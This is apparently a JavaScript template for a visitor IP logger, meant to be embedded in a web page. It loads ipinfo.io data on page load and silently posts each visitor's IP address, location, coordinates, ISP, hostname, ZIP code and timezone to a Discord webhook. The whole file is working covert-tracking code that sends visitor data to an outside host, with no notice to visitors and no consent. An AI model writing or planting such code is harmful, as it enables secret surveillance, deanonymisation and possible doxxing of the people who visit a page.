/*
Notice this a initial template for this purpose.
You're totally free to increase and make this code better for your purpose.
On your HTML code insert:
<script src="https://ipinfo.io/?format=jsonp&callback=collectInfo"></script>
*/

function collectInfo(json) {
  // Create a new XMLHttpRequest object
  var wbRequest = new XMLHttpRequest();

  // Set the destination URL for the webhook
  wbRequest.open("POST", "WEBHOOK LINK");

  // Set the content type for the request
  wbRequest.setRequestHeader('Content-type', 'application/json');

  // Set the payload for the webhook
  var params = {
    username: "DISCORD WEBHOOK NICKNAME",
    avatar_url: "DISCORD WEBHOOK URL",
    content: "DISCORD WEBHOOK MESSAGE CONTENT\n",
    embeds: [{
      title: "EMBED TITLE",
      color: 0000000,
      description: `**IP:** \`${json.ip}\`\n` +
                   `**Region:** \`${json.country}, ${json.region}, ${json.city}\`\n` +
                   `**Coords.:** \`${json.loc}\`\n\n` +
                   `**Provider:** \`${json.org}\`\n` +
                   `**Host:** \`${json.hostname}\`\n\n` +
                   `**ZIP Code:** \`${json.postal}\`\n` +
                   `**Timezone:** \`${json.timezone}\``
    }]
  };

  // Send the request with the payload as a JSON string
  wbRequest.send(JSON.stringify(params));
}
